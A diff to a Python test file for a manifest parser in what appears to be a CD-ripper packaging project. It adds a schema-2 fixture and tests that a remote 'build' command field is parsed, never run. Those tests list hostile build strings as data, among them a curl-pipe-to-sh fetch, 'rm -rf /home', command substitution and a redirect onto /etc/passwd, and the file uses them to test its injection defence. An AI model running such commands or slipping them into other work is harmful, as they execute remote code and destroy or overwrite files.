@@ -23,6 +23,7 @@ from platterpus.deps.ripper_manifest import (
     CHANNEL_STABLE,
     CHANNELS,
     SUPPORTED_SCHEMA,
+    SUPPORTED_SCHEMAS,
     CancellableFetcher,
     RipperManifest,
     fetch_manifest,
@@ -60,6 +61,53 @@ PUBLISHED: dict[str, Any] = {
             "install": "https://github.com/rmccann-hub/cyanrip/archive/ddf7ac3.tar.gz",
         },
     },
+}
+
+
+# The schema-2 manifest, verbatim from the fork's `release-manifest.json` at
+# `c455683` — the document live at `MANIFEST_URL` today. Round 11 added the `build`
+# field and moved the number; both are here because both are what a user's
+# Platterpus now fetches.
+#
+# **Kept as a second fixture rather than an edit to the first.** Schema 1 is still
+# accepted and still has to parse: it is the shape of every manifest published
+# before the bump, which is the direction round 11 §0's downgrade path runs in. One
+# fixture mutated into the new shape would have deleted the only test of the old one.
+PUBLISHED_V2: dict[str, Any] = {
+    "channels": {
+        "beta": {
+            "build": "meson setup build -Ddeclare_released=true && ninja -C build",
+            "commit": "c4d1a00",
+            "handshake_round": 10,
+            "install": "https://github.com/rmccann-hub/cyanrip/archive/c4d1a00.tar.gz",
+            "release_seq": 16,
+            "round_closed": True,
+            "version": "0.9.4-rc1+platterpus.6",
+        },
+        "stable": {
+            "build": "meson setup build -Ddeclare_released=true && ninja -C build",
+            "commit": "c4d1a00",
+            "handshake_round": 10,
+            "install": "https://github.com/rmccann-hub/cyanrip/archive/c4d1a00.tar.gz",
+            "release_seq": 16,
+            "round_closed": True,
+            "version": "0.9.4-rc1+platterpus.6",
+        },
+    },
+    "default_channel": "stable",
+    "latest_seq": 16,
+    "manifest_url": (
+        "https://raw.githubusercontent.com/rmccann-hub/cyanrip/"
+        "platterpus-fork/release-manifest.json"
+    ),
+    "note": (
+        "Machine-readable. Order by release_seq -- the version string cannot be "
+        "ordered, because the part that advances is SemVer build metadata, which "
+        "is ignored for precedence."
+    ),
+    "project": "cyanrip-fork",
+    "repo": "https://github.com/rmccann-hub/cyanrip",
+    "schema": 2,
 }
 
 
@@ -132,7 +180,7 @@ def test_the_channel_is_read_from_the_manifest_not_sniffed_from_the_version() ->
     assert beta.channel == CHANNEL_BETA, "a clean-looking version is still beta"
 
 
-@pytest.mark.parametrize("schema", [0, 2, 3, 99])
+@pytest.mark.parametrize("schema", [0, 3, 99])
 def test_an_unimplemented_schema_is_refused_not_guessed_at(schema: int) -> None:
     """Refusing is what the field is FOR — a consumer that guesses makes it useless."""
     document = json.loads(json.dumps(PUBLISHED))
@@ -140,13 +188,31 @@ def test_an_unimplemented_schema_is_refused_not_guessed_at(schema: int) -> None:
     assert parse_manifest(json.dumps(document)) is None
 
 
-def test_the_supported_schema_is_the_one_the_fixture_declares() -> None:
+def test_the_supported_schema_is_the_one_the_newest_fixture_declares() -> None:
     """Non-triviality floor for the test above: it must be refusing the *right* thing.
 
     Without this, `SUPPORTED_SCHEMA` could drift to a value no manifest carries and
     the parametrized refusals above would all pass while the real manifest failed.
+
+    Checked against `PUBLISHED_V2`, the *newest* real document, because that is the
+    one a user's Platterpus meets today.
     """
-    assert PUBLISHED["schema"] == SUPPORTED_SCHEMA
+    assert PUBLISHED_V2["schema"] == SUPPORTED_SCHEMA
+
+
+def test_every_accepted_schema_has_a_real_fixture_behind_it() -> None:
+    """`SUPPORTED_SCHEMAS` may not carry a number nothing in this file exercises.
+
+    The pair above tests the *newest*. This tests the rest, and it is the one that
+    stops the accepted set quietly growing a value whose fields nobody implemented —
+    the schema-1 half is exactly what round 11 §0's downgrade path depends on.
+    """
+    fixtures = {doc["schema"] for doc in (PUBLISHED, PUBLISHED_V2)}
+    missing = sorted(SUPPORTED_SCHEMAS - fixtures)
+    assert not missing, (
+        f"schema(s) {missing} are accepted but no real published document in this "
+        "file exercises them — add the fixture or stop accepting the number."
+    )
 
 
 @pytest.mark.parametrize(
@@ -436,3 +502,110 @@ def test_the_offer_never_installs_anything() -> None:
             f"SAY, never what to run. Installing a ripper is a handshake event and "
             f"must stay a person's decision."
         )
+
+
+# --- Schema 2's `build` field: parsed, never executed -----------------------
+#
+# Round 11 §J1 asked us to take the build command from the manifest instead of
+# hardcoding `-Ddeclare_released=true`, because the option does not exist before
+# `+platterpus.6` and meson fails the WHOLE configure on an unknown `-D` — so a
+# constant would make our own current pin unbuildable and kill the downgrade path.
+#
+# We agreed with the requirement and refused the mechanism. The field is a *shell
+# command string*; running it would turn a remote JSON document into arbitrary
+# command execution inside the user's container, on a path whose later steps run
+# `sudo install`. So we parse it, keep only allowlisted `-D` options, and build with
+# our own command. These tests are that boundary.
+
+
+def test_the_published_v2_manifest_parses_and_carries_the_build_option() -> None:
+    """The floor for this whole section, against the real document."""
+    parsed = parse_manifest(json.dumps(PUBLISHED_V2))
+    assert parsed is not None, "the live schema-2 manifest must parse"
+    assert parsed.schema == 2
+    stable = parsed.channel(CHANNEL_STABLE)
+    assert stable is not None
+    assert stable.commit == "c4d1a00"
+    assert stable.meson_options == ("-Ddeclare_released=true",), (
+        "the one option the live manifest carries did not survive validation"
+    )
+
+
+def test_a_schema_1_manifest_still_parses_and_carries_no_options() -> None:
+    """The downgrade direction, which is the reason schema 1 stays accepted.
+
+    A commit predating `meson_options.txt` must be built with a bare `meson setup`;
+    empty options is not a degraded answer here, it is the *correct* one.
+    """
+    parsed = parse_manifest(json.dumps(PUBLISHED))
+    assert parsed is not None
+    stable = parsed.channel(CHANNEL_STABLE)
+    assert stable is not None
+    assert stable.commit == "ddf7ac3", "fixture drifted off our production pin"
+    assert stable.meson_options == ()
+
+
+@pytest.mark.parametrize(
+    ("label", "build"),
+    [
+        ("shell chain into curl", "meson setup build && curl http://e.sh | sh"),
+        ("semicolon rm", "meson setup build; rm -rf /home && ninja -C build"),
+        ("backtick", "meson setup build `id` && ninja -C build"),
+        ("dollar-paren", "meson setup build $(id) && ninja -C build"),
+        ("redirect", "meson setup build > /etc/passwd && ninja -C build"),
+        ("unknown option", "meson setup build -Dprefix=/evil && ninja -C build"),
+        ("disallowed value", "meson setup build -Ddeclare_released=yes"),
+        ("option with no value", "meson setup build -Ddeclare_released"),
+        ("a different program", "make install && ninja -C build"),
+        ("not a string", 42),
+        ("a list", ["meson", "setup"]),
+    ],
+)
+def test_a_build_field_we_do_not_fully_understand_yields_no_options(
+    label: str, build: Any
+) -> None:
+    """Refuse the WHOLE field, never a partial reading.
+
+    Two failures are being prevented and they are different. The obvious one is
+    execution — nothing here is ever run, so the shell metacharacters are inert by
+    construction; what these assert is that the *option extraction* does not quietly
+    salvage `-Ddeclare_released=true` out of a command that also says something we
+    did not understand.
+
+    The subtler one: silently dropping the part we dislike and keeping the rest turns
+    a build instruction into something nobody wrote. A command we only partly
+    understand is a command we do not understand.
+    """
+    document = json.loads(json.dumps(PUBLISHED_V2))
+    document["channels"]["stable"]["build"] = build
+    parsed = parse_manifest(json.dumps(document))
+    assert parsed is not None, "a bad `build` must not drop the row — it is not fatal"
+    stable = parsed.channel(CHANNEL_STABLE)
+    assert stable is not None
+    assert stable.meson_options == (), f"{label}: options survived validation"
+
+
+def test_an_oversized_build_field_is_refused() -> None:
+    """Bounded like every other inbound string — the seam's line-length rule."""
+    document = json.loads(json.dumps(PUBLISHED_V2))
+    document["channels"]["stable"]["build"] = "-Ddeclare_released=true " * 500
+    parsed = parse_manifest(json.dumps(document))
+    assert parsed is not None
+    stable = parsed.channel(CHANNEL_STABLE)
+    assert stable is not None and stable.meson_options == ()
+
+
+def test_the_refusals_above_are_not_vacuous() -> None:
+    """The revert check, as an assertion rather than a memory.
+
+    Every case in the parametrized test expects `()`. If the validator were changed
+    to return `()` unconditionally, all of them would still pass — and so would the
+    schema-1 test, which also expects `()`. This is the one that would fail.
+    """
+    accepted = parse_manifest(json.dumps(PUBLISHED_V2))
+    assert accepted is not None
+    stable = accepted.channel(CHANNEL_STABLE)
+    assert stable is not None
+    assert stable.meson_options, (
+        "the validator accepts nothing at all — every refusal test above is vacuous"
+    )
